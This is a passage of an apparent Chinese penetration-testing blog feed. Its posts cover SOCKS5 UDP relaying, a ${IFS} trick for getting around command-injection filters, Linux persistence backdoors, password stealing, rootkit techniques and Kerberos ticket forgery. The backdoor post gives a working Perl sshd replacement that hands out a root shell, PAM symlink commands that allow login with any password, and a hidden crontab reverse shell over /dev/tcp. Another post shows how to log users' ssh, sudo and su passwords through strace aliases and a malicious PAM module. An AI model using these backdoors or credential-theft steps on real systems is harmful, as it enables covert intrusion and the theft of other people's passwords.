Associate链接应当只对应一个目的IP+port，但是基于其第三条要点，推测其大概率允许一个UDP Associate所创建的listener对应多个目的IP+port，只要在标准的包头中定义好此包的目的IP+port即可</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>由于网上开源的socks5服务器99%都是单独的服务器，不会涉及多跳的问题，故而我的工具实现起来会较复杂一些</p><p>首先agent需要在接收到client发来的UDP Associate请求后，现在自身机器上打开一个UDP Listener，之后向admin提交启动UDP Associate的消息，admin在收到此消息后也在本地打开一个UDP listener，并且回复agent，告知自身listener的详细信息，agent在收到此消息后，将此详细信息中包含的listener地址+端口以标准的socks5响应回复给client。此时client就可以向admin的此listener发送数据了，admin会将这些数据打包后发送给对应的agent，agent解析并保存要点三中的标头，将数据包发送给对应IP+port。agent在收到相关udp包的回复包后，查找存储的标头，用此标头重新封装回复包，打包返回给admin，admin在收到此数据包后，查找对应的UDP Listener，将数据包由对应的UDP Listener发送给client，从而完成通讯</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实际上UDP Associate在实际应用中非常小众，一方面是应用场景不够多，另一方面就是性能也不够好(一个UDP Associate需要消耗一个UDP Listener和一个TCP Conn)，还有就是对于client要求也比较高，要求client自身拥有处理丢包重传的能力，socks5服务器是不管理丢包重传方面的问题的。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackerone-Knowledege</title>
      <link href="Hackerone-Knowledege.html"/>
      <url>Hackerone-Knowledege.html</url>
      
        <content type="html"><![CDATA[<ul><li>当一个命令执行漏洞过滤了空格符号且后端服务器为linux时，可以利用<code>$&#123;IFS&#125;</code>这个特殊的内置变量来绕过，此变量是bash中默认的域分隔符。其默认值是空格，tab, 和新行(即” \r\n”，其中” \r\n”任意一个值都代表”空白”)。并且当遇到需要分割字符串的场景时，多个连续的空白将会被压缩为一个空白（经测试，压缩为了空格），故而可以用来代替空格使用。</li></ul><p>还有一些别的方法，例如：</p><p>ls$IFS-la<br>ls$IFS$100-la</p>]]></content>
      
      
      <categories>
          
          <category> 赏金猎人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug bounty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux后门权限维持</title>
      <link href="Linux-backdoors.html"/>
      <url>Linux-backdoors.html</url>
      
        <content type="html"><![CDATA[<h2 id="sshd后门"><a href="#sshd后门" class="headerlink" title="sshd后门"></a>sshd后门</h2><p>sshd后门应该是比较老的一种后门维持方式了，简单来说需要的条件是目标机上需要装有perl环境以及root权限</p><p>在获取root权限后，首先<code>cp /usr/sbin/sshd /usr/bin/sshd</code>保存一份真的sshd文件</p><p>之后在sbin目录下新建一个sshd文件，并在里面写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl</span><br><span class="line">exec&quot;&#x2F;bin&#x2F;sh&quot;if(getpeername(STDIN)&#x3D;~&#x2F;^..zf&#x2F;);</span><br><span class="line">exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125;&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV;</span><br></pre></td></tr></table></figure><p>代码的解释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一行， 如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（Big 网络字节序中的16进制字符串为\x00\x00zf， 正好匹配上perl正则 ..zf，上述代码中的zf是Big 网络字节序的Ascii表示形式），则执行&#x2F;bin&#x2F;sh，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell （因为sshd 是以root权限运行的）给远程socket  （一般只有攻击者指定连接的源端口才能触发这一行的执行）</span><br><span class="line"></span><br><span class="line">第二行  启动sshd (&#x2F;usr&#x2F;bin&#x2F;sshd是真正的sshd)服务 ，凡是传递给&#x2F;usr&#x2F;sbin&#x2F;sshd (后门)的参数都传递给真正的sshd （这一行保证了普通用户也可以正常使用ssh 服务，登录并不会有什么异常现象）</span><br></pre></td></tr></table></figure><p>之后保存文件，并<code>chmod +x sshd</code></p><p>重启sshd服务<code>service sshd restart</code></p><p>之后想要连接时只需要使用socat，执行以下语句即可:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.0.7:22,sourceport&#x3D;31334</span><br></pre></td></tr></table></figure><p>语句代表的意思为在本机的标准输入输出与远端的192.168.0.7:22建立pipe以此来传输数据</p><p>而在连接建立的时候，目标机会首先启动sshd来处理连接，此时由于标准输入还未被重定向至socat建立的socket，故而此时脚本第一句执行失败，直接去执行了真正的sshd文件，然后sshd文件被执行后会fork一个子进程来处理传入的连接，与其他的程序fork子进程不一样，sshd fork子进程后，子进程会再次执行sshd（重点），故而控制权又回到了我们的伪造sshd的手上，而此时此子进程的标准输入输出已经被重定向至socat建立的socket，故而正则表达式匹配正确，目标及执行/bin/sh并返回一个root权限的shell</p><p>如下图：</p><p><img src="/image/Linux_Backdoor/sshd.jpg" alt="sshd"></p><h2 id="ssh-pam任意密码后门"><a href="#ssh-pam任意密码后门" class="headerlink" title="ssh pam任意密码后门"></a>ssh pam任意密码后门</h2><p>同样也是很常见的后门了，基于以下语句实现:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;chsh;&#x2F;tmp&#x2F;chsh -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;chfn;&#x2F;tmp&#x2F;chfn -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;runuser;&#x2F;tmp&#x2F;runuser -oPort&#x3D;1337</span><br></pre></td></tr></table></figure><p>在root权限下执行以上语句，就可以输入任意密码登陆任意用户</p><p><img src="/image/Linux_Backdoor/anypass.jpg" alt="anypass"></p><p>这里我随便输入了一个密码，就可以登录root用户</p><p>很奇怪，不是么？那么这是为什么呢？</p><p>首先就是sshd默认支持pam认证登录，而登录时，系统选择的pam文件名将是启动的程序文件名，就比如我们使用<code>/tmp/su</code>来启动sshd，那么在pam认证时，将会使用<code>/etc/pam.d/su</code>来作为认证文件</p><p>此外，在<code>/etc/pam.d/su</code>中，有一句<code>auth sufficient pam_rootok.so</code>，这里要说明一下pam的控制关键字：</p><p><img src="/image/Linux_Backdoor/pam.jpg" alt="pam"></p><p>也就是说，只要<code>pam_rootok.so</code>模块返回true，则pam认证流程将会直接成功</p><p>接着，我们就需要知道如何让<code>pam_rootok.so</code>模块返回true，通过查询相关资料，我们可以知道<code>pam_rootok.so</code>直接判断了当前的uid是否为0</p><p><img src="/image/Linux_Backdoor/how-pam_rootok-work.jpg" alt="how-pam_rootok-work"></p><p>如果你再去看看<code>pam_rootok.so</code>的源码，你会发现它使用了getuid()来判断uid</p><p>而getuid()的解释原文<code>getuid() returns the real userID of the calling process</code></p><p>这下就很清晰了，为何我们能够通过<code>pam_rootok.so</code>的认证，是由于调用这个模块的进程是/usr/sbin/sshd，并且这个进程是以root权限运行的，此时getuid()将返回0，这样就保证了不管输入什么密码，<code>pam_rootok.so</code>都会认证成功，从而向sshd进程返回success，通过认证阶段</p><p>从以上的分析，可以发现实现这样的trick，是需要一些条件的</p><ol><li><code>/etc/ssh/sshd_config</code>中必须为<code>UsePAM yes</code>，即允许pam认证(默认)</li><li>ssh必须允许root用户远程登录(如果不允许root远程登录，也可用其他的已存在用户)</li><li>调用的pam模块必须包含<code>auth sufficient pam_rootok.so</code>，而符合条件的模块除了su，还有chsh，chfn，runuser</li><li>创建的软链接文件的文件名必须是pam模块名，不可随意起名，因为选择模块即是基于文件名选择</li></ol><h2 id="crontab后门"><a href="#crontab后门" class="headerlink" title="crontab后门"></a>crontab后门</h2><p>这个怕是老生常谈了，基本上每一个管理员在意识到中毒后都会执行<code>crontab -l</code>查看一下定时任务</p><p>当然，这里不会只是简单写入定时任务，这没有任何意义</p><p>实际上，我们可以借助一些trick来隐藏<code>crontab -l</code>的输出，从而欺骗管理员</p><p>例如，执行如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure><p>此时管理员如果执行<code>crontab -l</code>，将会发现没有任何异常</p><p><img src="/image/Linux_Backdoor/crontab.jpg" alt="crontab"></p><p>可以看到，如果用vim打开对应的计划任务文件，可以清晰看见恶意的任务，但是，当管理员执行<code>crontab -l</code>时，却只能看见<code>no crontab for xxx</code></p><p>那么这是为啥呢？</p><p>原理在于，<code>crontab -l</code>实际上是使用了cat命令，但是cat命令默认将会解析\r，而\r的意思是回到行首，在payload中，我们又用了<code>%100c</code>创建了100个空字符“覆盖”了恶意的payload，所以在<code>crontab -l</code>时，无法看到被“覆盖”的恶意payload，从而达到了隐藏的效果</p><h2 id="各类rootkit"><a href="#各类rootkit" class="headerlink" title="各类rootkit"></a>各类rootkit</h2><p>linux rootkit算是最好用的也最强大的后门，github上有不少大师傅也开源了不少rootkit，我自己也在研究中，想自己写一个rootkit XD</p><p>写完后再添加link hh</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码“水坑”</title>
      <link href="Steal-password-by-alias.html"/>
      <url>Steal-password-by-alias.html</url>
      
        <content type="html"><![CDATA[<h1 id="第一个暗桩-–-ssh命令"><a href="#第一个暗桩-–-ssh命令" class="headerlink" title="第一个暗桩 – ssh命令"></a>第一个暗桩 – ssh命令</h1><p>  当我们控制了一台linux服务器，并且发现有用户使用这台机器通过ssh连接其他机器的时候，那么假设我们有此用户的权限的shell，这时我们就可以巧用alias来窃取用户的密码</p><p>  首先我们将会用到strace命令，这在大部分的linux机器当中都有预装。为了劫持用户的ssh命令，我们需要修改～/.bashrc（修改前请先备份）</p><p>  在.bashrc中加入如下语句：</p><p>  alias ssh=’strace -o  /var/tmp/.syscache-<code>date +&#39;%Y-%m-%d+%H:%m:%S&#39;</code>.log -s 4096 ssh’</p><p>  这句话的意思就是当用户使用ssh时，实际上我们悄悄的对ssh使用了strace来跟踪其调用过程，并将其输出文件保存在/var/tmp下，这样，当合法用户登陆被我们控制的机器，并使用ssh登陆其他机器的时候，其登陆其他机器时输入的密码、地址就会被我们记录下来。如下图</p><p><img src="/image/Steal-pass/strace.jpg" alt="strace"></p><p>此时我们使用grep，查找密码以及用户登陆的地址：</p><p><img src="/image/Steal-pass/password.jpg" alt="password"></p><p><img src="/image/Steal-pass/address.jpg" alt="address"></p><p>可以看到成功捕获了用户名、地址、密码</p><h1 id="第二个暗桩-–-窃取sudo密码"><a href="#第二个暗桩-–-窃取sudo密码" class="headerlink" title="第二个暗桩 – 窃取sudo密码"></a>第二个暗桩 – 窃取sudo密码</h1><p>  当我们控制了一台linux服务器，并且发现自己控制的用户经常使用sudo执行命令时，我们也可以巧用alias来窃取用户的sudo密码</p><p>  自己也写了个小工具：<a href="https://github.com/ph4ntonn/Impost3r">Impost3r</a></p><p>  只需要合法用户登陆后使用sudo命令，就可以窃取到其密码，从而变相提权，甚至可以可以拿来做ssh账户/密码，大多数人密码都是一样的</p><h1 id="第三个暗桩-–-劫持各类系统命令"><a href="#第三个暗桩-–-劫持各类系统命令" class="headerlink" title="第三个暗桩 – 劫持各类系统命令"></a>第三个暗桩 – 劫持各类系统命令</h1><p>  这个和第二个很像，但是我觉得不是很妥当，毕竟会弹出非预期的询问密码的操作，故而不去使用</p><h1 id="第四个暗桩-–-修改pam文件"><a href="#第四个暗桩-–-修改pam文件" class="headerlink" title="第四个暗桩 – 修改pam文件"></a>第四个暗桩 – 修改pam文件</h1><p>  在linux当中，用户的认证都是基于pam的，也就是说如果我们在获取了root权限的情况下,可以通过修改pam相关模块及配置来窃取所有通过ssh登陆至此机器的用户名/密码、所有执行su命令的用户名/密码</p><p>  有一个小工具:<a href="https://github.com/mthbernardes/sshLooterC">looterc</a></p><p>  稍加修改，并进行编译，得到<code>looter.so</code>，并将此so复制至<code>/lib/security</code>下(如果是ubuntu，应当在<code>/lib/x86_64-linux-gnu/security</code>下)</p><p>  再修改<code>/etc/pam.d/</code>下的common-auth，在最后一行加上以下两句语句:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth optional looter.so</span><br><span class="line">account optional looter.so</span><br></pre></td></tr></table></figure><p>  保存并退出后，任何使用su命令的普通用户的用户名和密码都将会被捕获</p><p>  如果想窃取所有ssh到此机器上的用户名/密码，那么就修改<code>/etc/pam.d/</code>下的sshd文件，同样在最后加上同样的两句语句</p><p>  保存并退出后，任何使用ssh命令连接到此机器的用户的用户名和密码都将会被捕获</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  手法要骚，想法要淫荡（笑）</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rootkit分析&amp;&amp;linux内核机制学习（一）</title>
      <link href="rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0.html"/>
      <url>rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<h1 id="rootkit自身隐藏及保护"><a href="#rootkit自身隐藏及保护" class="headerlink" title="rootkit自身隐藏及保护"></a>rootkit自身隐藏及保护</h1><h2 id="隐藏自身"><a href="#隐藏自身" class="headerlink" title="隐藏自身"></a>隐藏自身</h2><p>先讲讲自身的隐藏，这里主要是用到了以下函数段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">module_list &#x3D; THIS_MODULE-&gt;list.prev;</span><br><span class="line"></span><br><span class="line">list_del(&amp;THIS_MODULE-&gt;list);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中module_list保存了此模块所在的链表结构体的第一个结构体，即链表的头节点，以便之后的恢复操作</p><p>list_del函数将此模块所在的链表结构体的头节点删除，即将代表自身的结构体删除，从而在lsmod命令中隐藏此模块</p><h2 id="恢复自身"><a href="#恢复自身" class="headerlink" title="恢复自身"></a>恢复自身</h2><p>讲完隐藏，讲讲自身恢复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list_add(&amp;THIS_MODULE-&gt;list, module_list);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里利用到了list_add函数，将之前保存的module结构体（即之前代表自身的结构体）添加到链表头，从而重新在lsmod命令中可见</p><h2 id="保护自身不被删除"><a href="#保护自身不被删除" class="headerlink" title="保护自身不被删除"></a>保护自身不被删除</h2><p>保护自身不被删除主要利用了以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try_module_get(THIS_MODULE);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用了try_module_get函数，将模块的使用计数加一，从而使得模块表现为“正在被使用”，由于linux不能卸载正在使用的模块，从而保护自身不被删除</p><h2 id="解除保护"><a href="#解除保护" class="headerlink" title="解除保护"></a>解除保护</h2><p>解除保护代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_put(THIS_MODULE); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用了module_put函数，将模块的使用计数减一至0，从而将其表示为空闲状态以卸载</p><h1 id="rootkit查找系统调用表"><a href="#rootkit查找系统调用表" class="headerlink" title="rootkit查找系统调用表"></a>rootkit查找系统调用表</h1><p>  首先系统调用表（syscall_table)是存在在内核中的一个数组，里面存放了所有指向系统调用函数的指针，故而rootkit若想hook系统调用，就必须先找到syscall_table在内存当中的地址（在早期的Linux内核中，是通过一个变量SYSCALL_TABLE明确指出其位置的，而在较新的kernel中移除了这一个变量，防止被滥用）</p><p>  此rootkit采用的是暴力搜索遍历的方式来找到syscall_table，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void **sys_call_table;</span><br><span class="line"></span><br><span class="line">void **find_syscall_table(void)</span><br><span class="line">&#123;</span><br><span class="line">    void **sctable;</span><br><span class="line">    void *i &#x3D; (void*) START_ADDRESS;</span><br><span class="line"></span><br><span class="line">    while (i &lt; END_ADDRESS) &#123;</span><br><span class="line">        sctable &#x3D; (void **) i;</span><br><span class="line"></span><br><span class="line">        if (sctable[__NR_close] &#x3D;&#x3D; (void *) sys_close) &#123;</span><br><span class="line">            size_t j;</span><br><span class="line">            const unsigned int SYS_CALL_NUM &#x3D; 300;</span><br><span class="line">            for (j &#x3D; 0; j &lt; SYS_CALL_NUM; j ++) &#123;</span><br><span class="line">                if (sctable[j] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                    goto skip;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return sctable;</span><br><span class="line">        &#125;</span><br><span class="line">skip:</span><br><span class="line">        ;</span><br><span class="line">        i +&#x3D; sizeof(void *);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们先要确定一个比syscall_table更高位置的内存来作为起始点（不然你遍历不到），之后我们需要知道一个已经确定位置的函数，这里用到了sys_close函数，这个函数的位置是相对于syscall_table处在更低的内存位置，这样就可以用来标示遍历的终点。</p><p>之后将i赋值为内存地址，在每一次遍历中，尝试将i代表的内存地址加上__NR_close（sys_close函数的偏移地址），查看加上偏移地址后的内存中所存放的指针所指向的地址是否指向了sys_close函数的地址，如果是，则代表我们找到了系统调用表的表头，如果不是，那么i加上一个void *的大小（继续推进内存地址），继续进行遍历，直到找到正确的表头</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos黄金白银票据</title>
      <link href="Kerberos-gold-sliver-ticket.html"/>
      <url>Kerberos-gold-sliver-ticket.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了方便叙述，假定A为客户端，B为服务端</p><h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><p>  从上一篇文章中我们可以懂得微软对于windosw系列的Kerberos协议的具体实现过程</p><p>  那么我们可以总结出来一点就是，实际上A作为客户端访问B的时候，其权限完全是基于KDC所颁发的PAC的，B也只认这个PAC，并以这个PAC为参考来决定是否允许A访问B上的一些资源，那也就是说如果我们能够伪造发送给B的serrviceTicket中的PAC，我们就可以随意对B的资源进行访问了</p><p>  让我们来看看构成ServerTicket的必要条件：KDC密码的副本以及B的密码的副本（两者的hash），主要缺少的就是B的密码的hash值，那么如果我们有了这个hash值，我们就可以伪造PAC，伪造PAC后面的校验签名，从而实现对B资源完全的访问权。那么这样的票据就被称为白银票据，拥有这样的票据表示着客户端A对B有着完全的访问权，但是注意了，由于我们同样也不知道KDC的密码hash，所以实际上我们伪造的PAC最后是没有有效的KDC的校验签名的，只有由B的密码hash生成的校验签名，而如果此时服务端开启了KDC PAC签名校验，那么PAC的校验将无法通过，白银票据也就会失效，所以白银票据成功的大前提是请求的服务不校验KDC PAC签名。</p><p>  白银票据的限制就在于只能拥有某一台服务器所提供的部分服务的访问权，而不能拥有所有的，换一台C服务器或者需求权限更高的服务，白银票据就会失去效用。</p><p>  给一些好的参考：<br><a href="/archives/Kerberos/sliverticket.html">银票</a></p><p><a href="/archives/Kerberos/sliverticket_defend.html">银票防御</a></p><p><a href="/archives/Kerberos/sliverticket_exploit.html">银票利用</a></p><h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><p>  白银票据的限制在黄金票据中不复存在，一旦拥有了黄金票据，你就拥有了这个域当中的最高权限。</p><p>  让我们来回顾一下A发送给B的ServiceTicket是如何生成的</p><p>  首先，是A要向TGS发送由AS颁发的TGT，证明自己已经通过了合法性校验，是域中的合法用户，然后由TGS利用KDC的永久密钥（也称为krgtgt账户的密码hash，krgtgt账户相当于是域管理员）解密TGT，校验签名，确定TGT中的PAC没有被篡改之后，重新签名PAC，并将A与B之间通讯所需要的密钥SessionKey以及重新签名后的PAC用B的密码hash进行加密，将两者组合为了ServiceTicket。</p><p>  那么我们可以看到，这整个过程的关键点就是TGT中所携带的PAC，只要我们能够篡改TGT中的PAC，欺骗TGS，就能拿到访问任意服务器的ServiceTicket。而要想篡改TGT，唯一的障碍就是krgtgt用户的密码hash，有了这个密码的hash，我们就可以解密TGT，伪造任意PAC来欺骗TGS为A颁发在此域中访问任意一台服务器的任意ServiceTicket，获取在此域中的最高权限</p><p>  我们把这种票据称为黄金票据</p><p>  提供一些好的参考:</p><p>  <a href="/archives/Kerberos/goldenticket.html">黄金票据</a></p><h1 id="增强型黄金票据"><a href="#增强型黄金票据" class="headerlink" title="增强型黄金票据"></a>增强型黄金票据</h1><p>  虽然黄金票据在当前域中拥有着最高的权限，但是普通的黄金票据无法跨域使用，因为在一个子域中缺少了EnterpriseAdmins组，这是只有在域林中的根域才存在的用户组，对整个域有着管理权，其SID最后三位为519，而在子域中最高级别的用户仅仅是Domain Admins，SID最后三位为512，那也就表明当使用mimikatz伪造黄金票据时，mimikatz会使用SID号（类似于S-1-5-21-3641416521-285861825-2863956705-）和RID号（512，519之类的）拼接成新的SID（S-1-5-21-3641416521-285861825-2863956705-519），但是这个SID号在根域里根本就不存在（根域DC上的EnterpriseAdmins组的SID可能是S-1-5-21-4249968736-1423802980-663233003-519）,所以无法使用普通的黄金票在域林中跨域访问资源。</p><p>  在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。</p><p>  需要的材料只是根域的SID号，一个子域的krgtgt密码hash即可，使用mimikatz制作</p><p>  下面是Blackhat资料，里面内容很多，以后慢慢整理成文章</p><p>  <a href="/archives/Kerberos/blackhat.pdf">BlackHat</a></p><h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>  一般是使用mimikatz来抓取用户的密码hash</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos MS14-068</title>
      <link href="Kerberos.html"/>
      <url>Kerberos.html</url>
      
        <content type="html"><![CDATA[<h1 id="MS14-068漏洞"><a href="#MS14-068漏洞" class="headerlink" title="MS14-068漏洞"></a>MS14-068漏洞</h1><p>  先从一个知名的漏洞开始吧：MS14-068</p><p>  这个漏洞在当时影响了全版本的Windows服务器，攻击者可以籍由这个漏洞实现权限提升，从普通域用户提升至域管理员身份。</p><p>  那在分析以及复现这个漏洞之前，先让我们来看看什么是Kerberos协议，这是所有这一切的核心所在</p><h2 id="Kerberos：地狱三头犬"><a href="#Kerberos：地狱三头犬" class="headerlink" title="Kerberos：地狱三头犬"></a>Kerberos：地狱三头犬</h2><p>  Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p><p>  假设一个场景，即有两者A和B，他们共同享有同样的一个secret，那么A在不安全的网络环境下如何向B证明其身份就成了一个问题</p><p>  最简单的方法就是A直接发送secret给B，让B来验证其真实性，但是在不安全的网络环境中，这段secret随时可能被恶意攻击者窃取，故而这一方法不可行</p><p>  那么要不A将secret作为密钥，用secret加密一段数据后，将密文和明文一起发给B，由B再进行校验？这样听起来可行，但是只要时间允许，攻击者是有可能对加密后的密文和明文之间进行破解来得到密钥的，故而也不可取</p><p>  那么Kerberos就是为了解决这个问题而产生的，它为这个过程带来了一个第三方机构KDC，每次的通讯都会由KDC来向A颁发一个临时的通讯密钥，保证每一次密钥都是不重复的，防止攻击者对其进行破解</p><p>  具体来说，KDC是由两部分组成的，AS和TGS，AS主要的职责是负责对申请者的认证，而TGS主要是向申请者颁发Service Ticket（后面会详细说）</p><p>  大概流程可以看下图：</p><p>  <img src="/image/Kerberos/snapshot.png" alt="auth"></p><p>  <strong>从图中可以看出，一开始A向AS认证的时候利用的是时间戳，这也引出了一点就是，Kerberos协议要求整个域内时间必须同步</strong></p><p>  详细流程大致如下：</p><p>  第①步：KRB_AS_REQ：Client-A发送Authenticator向KDC的AS服务认证自己的身份（通过提供自身密码加密的一个时间戳TimeStamp）</p><p>第②步：KRB_AS_REP：AS通过KDC数据库中存储的Client-A密码的副本，解密收到的Authenticator，如果解密出的TimeStamp符合要求，则AS服务认为Client-A就是所谓的Client-A。认证成功后，AS服务生成一个短期有效的SessionKeya-kdc，将该Key使用A的密码副本加密成密文1，另外将Key连同时间戳标志（控制该SessionKey的有效时间）通过TGS服务的密码也就是KDC的密码加密为密文2（称为TGT），将这两个密文组合成KRB_AS_REP返回给Client-A</p><p>第③步：KRB_TGS_REQ：Client-A在接收到KRB_AS_REP后，首先使用自身密码解密密文1得到SessionKeya-kdc，此时需要注意的是，密文2（TGT）是被KDC的密码加密的，所以Client-A无法解密，这也是Kerberos协议设计的精妙之处，既解决了Server端（TGS相对于Client-A也称之为Server端）无法及时接收SessionKey的问题，又不怕Client-A对该TGT的伪造，因为Client-A不知道Server端的密码</p><p>得到SessionKeya-kdc后，Client-A利用其加密时间戳生成Authenticator用于向TGS申请Client-A与Client-B进行认证所需的SessionKeya-b，连同刚才KRB_AS_REP接收的TGT一同组合成KRB_TGS_REQ发送给TGS</p><p>第④步：KRB_TGS_REP：TGS在接收到KRB_TGS_REP之后，利用KDC密码解密TGT获得本来就该发送给自己的SessionKeya-kdc，然后用其解密KRB_TGS_REQ中的Authenticator得到Client-A发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的SessionKeya-b，注意此时利用SessionKeya-kdc将SessionKeya-b加密为密文1，然后利用Server-B的密码将SessionKeya-b加密为密文2（称为ServiceTicket），两个密文一同构成KRB_TGS_REP返回给Client-A</p><p>第⑤步：KRB_AP_REQ：Client-A在接收到KRB_TGS_REP之后，首先使用缓存的SessionKeya-kdc将密文1中的SessionKeya-b解密出来，然后利用其加密时间戳生成Authenticator用于向B进行对自身的验证，另外，和刚才TGT一样，密文2也就是ServiceTicket是用Server-B的密码加密的，所以Client-A无法解密，也就无法伪造，这也同样解决了在三方认证中作为Server端的B无法及时接收SessionKey的问题，又不怕Client-A对ServiceTicket的伪造</p><p>第⑥步：KRB_AP_REP：Server-B受到KRB_AP_REQ之后，利用自身密码解密ServiceTicket，得到SessionKeya-b，然后用SessionKeya-b解密Authenticator得到时间戳，验证A的身份</p><p> 一个参考：</p><p> <a href="/archives/Kerberos/kerberos.html">详细过程</a>  </p><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>  那么以上就是Kerberos协议的标准实现过程，但是在实际运行的windows服务器上，微软对标准Kerberos协议进行了扩充，其中最重要的扩充就是增加了权限认证，即PAC（Privilege Attribute Certificate），特权属性证书</p><p>  PAC的扩充主要旨在帮助B知道A是否有访问自身某些资源的权限，因为原本Kerberos并没有规定权限方面的问题</p><p>  